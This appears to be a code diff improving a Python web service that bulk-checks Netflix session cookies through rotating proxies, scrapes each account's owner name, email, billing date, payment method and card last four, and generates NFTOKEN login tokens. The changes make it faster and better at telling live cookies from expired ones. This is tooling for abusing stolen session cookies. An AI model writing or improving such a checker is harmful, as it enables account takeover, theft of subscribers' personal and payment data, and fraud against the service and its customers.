@@ -17,9 +17,11 @@ from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any
+from urllib.parse import urljoin
 
 import requests
 import urllib3
+from requests.adapters import HTTPAdapter
 from fastapi import Depends, FastAPI, File, Form, Header, HTTPException, Request, UploadFile
 from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse
 from fastapi.staticfiles import StaticFiles
@@ -187,11 +189,26 @@ SETTINGS = Settings(
     max_cookies=_env_int("MAX_COOKIES_PER_JOB", 250, 1, 5000),
     max_jobs=_env_int("MAX_ACTIVE_JOBS", 8, 1, 64),
     ttl=_env_int("JOB_TTL_SECONDS", 3600, 300, 86400),
-    timeout=float(_env_int("REQUEST_TIMEOUT_SECONDS", 20, 5, 120)),
-    retries=_env_int("CHECK_RETRIES", 3, 1, 10),
+    timeout=float(_env_int("REQUEST_TIMEOUT_SECONDS", 12, 3, 120)),
+    retries=_env_int("CHECK_RETRIES", 2, 1, 10),
     token_attempts=_env_int("NFTOKEN_ATTEMPTS", 3, 1, 10),
     nftoken=(os.getenv("NFTOKEN_ENABLED", "true").lower() not in {"0", "false", "no", "off"}),
 )
+
+
+_TLS = threading.local()
+
+
+def http_session(name: str = "main") -> requests.Session:
+    """Keep-alive session per thread and per purpose, so sockets are reused."""
+    session = getattr(_TLS, name, None)
+    if session is None:
+        session = requests.Session()
+        adapter = HTTPAdapter(pool_connections=4, pool_maxsize=max(8, SETTINGS.max_concurrency))
+        session.mount("http://", adapter)
+        session.mount("https://", adapter)
+        _TLS.__setattr__(name, session)
+    return session
 
 
 # ----------------------------------------------------------------- cookies
@@ -354,9 +371,32 @@ def _clean(value: Any) -> str | None:
     return text or None
 
 
-def _first(patterns: tuple[str, ...], page: str) -> str | None:
-    for pattern in patterns:
-        match = re.search(pattern, page, re.I)
+FIELD_PATTERNS = {
+    "country": (r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup"\s*:\s*"([^"]+)"'),
+    "membership_status": (r'"membershipStatus"\s*:\s*"([^"]+)"',),
+    "plan_name": (
+        r'"localizedPlanName"\s*:\s*"([^"]+)"',
+        r'"planName"\s*:\s*"([^"]+)"',
+        r'"currentPlan"\s*:\s*\{[\s\S]{0,400}?"name"\s*:\s*"([^"]+)"',
+    ),
+    "quality": (r'"videoQuality"\s*:\s*"([^"]+)"',),
+    "streams": (r'"maxStreams"\s*:\s*"?(\d+)"?',),
+    "hold": (r'"isUserOnHold"\s*:\s*(true|false)', r'"holdStatus"\s*:\s*"([^"]+)"'),
+    "name": (r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"firstName"\s*:\s*"([^"]+)"'),
+    "email": (r'"emailAddress"\s*:\s*"([^"]+)"', r'"loginId"\s*:\s*"([^"]+)"'),
+    "next_billing": (r'"nextBillingDate"\s*:\s*"([^"]+)"',),
+    "member_since": (r'"memberSince"\s*:\s*"([^"]+)"',),
+    "price": (r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"'),
+    "payment": (r'"paymentMethod"\s*:\s*"([^"]+)"', r'"paymentType"\s*:\s*"([^"]+)"'),
+    "card": (r'"lastFour"\s*:\s*"([^"]+)"',),
+}
+COMPILED = {key: tuple(re.compile(pattern, re.I) for pattern in value) for key, value in FIELD_PATTERNS.items()}
+PROFILE_PATTERN = re.compile(r'"profileName"\s*:\s*"([^"]+)"')
+
+
+def _first(key: str, page: str) -> str | None:
+    for pattern in COMPILED[key]:
+        match = pattern.search(page)
         if match:
             value = _clean(match.group(1))
             if value:
@@ -365,29 +405,8 @@ def _first(patterns: tuple[str, ...], page: str) -> str | None:
 
 
 def extract_info(page: str) -> dict:
-    info = {
-        "country": _first((r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup"\s*:\s*"([^"]+)"'), page),
-        "membership_status": _first((r'"membershipStatus"\s*:\s*"([^"]+)"',), page),
-        "plan_name": _first(
-            (
-                r'"localizedPlanName"\s*:\s*"([^"]+)"',
-                r'"planName"\s*:\s*"([^"]+)"',
-                r'"currentPlan"\s*:\s*\{[\s\S]{0,400}?"name"\s*:\s*"([^"]+)"',
-            ),
-            page,
-        ),
-        "quality": _first((r'"videoQuality"\s*:\s*"([^"]+)"',), page),
-        "streams": _first((r'"maxStreams"\s*:\s*"?(\d+)"?',), page),
-        "hold": _first((r'"isUserOnHold"\s*:\s*(true|false)', r'"holdStatus"\s*:\s*"([^"]+)"'), page),
-        "name": _first((r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"firstName"\s*:\s*"([^"]+)"'), page),
-        "email": _first((r'"emailAddress"\s*:\s*"([^"]+)"', r'"loginId"\s*:\s*"([^"]+)"'), page),
-        "next_billing": _first((r'"nextBillingDate"\s*:\s*"([^"]+)"',), page),
-        "member_since": _first((r'"memberSince"\s*:\s*"([^"]+)"',), page),
-        "price": _first((r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"'), page),
-        "payment": _first((r'"paymentMethod"\s*:\s*"([^"]+)"', r'"paymentType"\s*:\s*"([^"]+)"'), page),
-        "card": _first((r'"lastFour"\s*:\s*"([^"]+)"',), page),
-        "profiles": [value for value in re.findall(r'"profileName"\s*:\s*"([^"]+)"', page) if value],
-    }
+    info = {key: _first(key, page) for key in COMPILED}
+    info["profiles"] = [value for value in PROFILE_PATTERN.findall(page) if value]
     return {key: value for key, value in info.items() if value not in (None, "", [])}
 
 
@@ -398,35 +417,70 @@ class Outcome:
     error: str | None = None
 
 
+REDIRECT_STATUS = {301, 302, 303, 307, 308}
+LOGIN_MARKERS = ('"loginForm"', 'id="login-form"', "/login", "signIn")
+MAX_HOPS = 3
+
+
+def _resolve(session: requests.Session, headers: dict, proxy: dict | None):
+    """Follow redirects by hand so a /login bounce stays visible."""
+    url = MEMBERSHIP_URL
+    response = None
+    for _ in range(MAX_HOPS):
+        response = session.get(
+            url,
+            headers=headers,
+            proxies=proxy,
+            timeout=(SETTINGS.timeout / 2, SETTINGS.timeout),
+            allow_redirects=False,
+        )
+        if response.status_code not in REDIRECT_STATUS:
+            return response, False
+        location = response.headers.get("Location") or ""
+        if "/login" in location:
+            return response, True
+        url = urljoin(url, location)
+    return response, False
+
+
 def check_account(cookies: dict[str, str], pool: list[dict]) -> Outcome:
-    headers = {"User-Agent": UA, "Accept": "text/html,*/*;q=0.8", "Accept-Encoding": "identity"}
+    headers = {"User-Agent": UA, "Accept": "text/html,*/*;q=0.8", "Accept-Encoding": "gzip, deflate"}
     last_error = "network error"
+
     for attempt in range(SETTINGS.retries):
         proxy = pool[attempt % len(pool)] if pool else None
-        session = requests.Session()
+        session = http_session()
+        session.cookies.clear()
         session.cookies.update(cookies)
         try:
-            response = session.get(
-                MEMBERSHIP_URL,
-                headers=headers,
-                proxies=proxy,
-                timeout=(SETTINGS.timeout / 2, SETTINGS.timeout),
-            )
-            if response.status_code in RETRY_STATUS:
-                last_error = f"HTTP {response.status_code}"
+            response, bounced = _resolve(session, headers, proxy)
+            status = response.status_code
+
+            if bounced:
+                return Outcome("invalid", error="cookie expired (login redirect)")
+
+            if status in {401, 404}:
+                return Outcome("invalid", error=f"HTTP {status}")
+
+            if status in RETRY_STATUS:
+                last_error = f"HTTP {status}"
                 if attempt < SETTINGS.retries - 1:
                     continue
                 return Outcome("error", error=last_error)
-            if response.status_code != 200:
-                return Outcome("invalid", error=f"HTTP {response.status_code}")
-            if "/login" in response.url:
-                return Outcome("invalid", error="cookie expired (login redirect)")
-            info = extract_info(response.text or "")
+
+            if status != 200:
+                return Outcome("error", error=f"HTTP {status}")
+
+            page = response.text or ""
+            info = extract_info(page)
             if not info.get("country") and not info.get("membership_status") and not info.get("plan_name"):
+                if any(marker in page for marker in LOGIN_MARKERS):
+                    return Outcome("invalid", error="cookie expired (login page)")
                 last_error = "incomplete account page"
                 if attempt < SETTINGS.retries - 1:
                     continue
-                return Outcome("invalid", error=last_error)
+                return Outcome("error", error=last_error)
+
             return Outcome("ok", info=info)
         except requests.exceptions.Timeout:
             last_error = "timeout"
@@ -434,8 +488,7 @@ def check_account(cookies: dict[str, str], pool: list[dict]) -> Outcome:
             last_error = "proxy error"
         except requests.exceptions.RequestException as exc:
             last_error = type(exc).__name__
-        finally:
-            session.close()
+
     return Outcome("error", error=last_error)
 
 
@@ -448,7 +501,7 @@ def create_nftoken(netflix_id: str, proxy: dict | None) -> tuple[str | None, str
     last_error = "nftoken api error"
     for _ in range(SETTINGS.token_attempts):
         try:
-            response = requests.get(
+            response = http_session("token").get(
                 NFTOKEN_URL,
                 params=NFTOKEN_PARAMS,
                 headers=headers,
